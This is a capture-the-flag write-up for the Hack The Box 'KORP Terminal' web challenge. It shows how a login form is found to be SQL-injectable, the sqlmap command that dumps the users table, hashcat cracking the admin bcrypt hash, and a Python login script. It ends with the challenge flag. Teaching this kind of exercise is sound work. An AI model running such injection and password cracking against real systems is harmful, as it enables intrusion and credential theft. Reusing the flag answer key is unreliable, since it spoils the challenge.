# KORP Terminal

Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

## Writeup

In the site if we try to send an **username** equal to **'**, this error code will appear:

```json
{"error":{"message":["1064","1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1","42000"],"type":"ProgrammingError"}}
```

So we can use **SQL injection** on **MariaDB** with **SQLmap**:

```bash
sqlmap -u "http://83.136.252.82:33660/" --forms --dump --ignore-code 401
```

This is the output:

```
Database: korp_terminal
Table: users
[1 entry]
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin    |
+----+--------------------------------------------------------------+----------+
```

Now we can try to crack the password:

```bash
hashcat -m 3200 '$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.' /usr/share/wordlists/rockyou.txt
```

With this output:

```
$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123
```

Now we can extract the flag:

```python
#!/usr/bin/python3
import requests

ip = "83.136.252.82"
port = 33660

url = f"http://{ip}:{port}/"

username = "admin"
password = "password123"

data = {
    'username' : username,
    'password' : password
}

req = requests.post(url, data=data)
print(req.text)
```

This is the flag:

```
HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}
```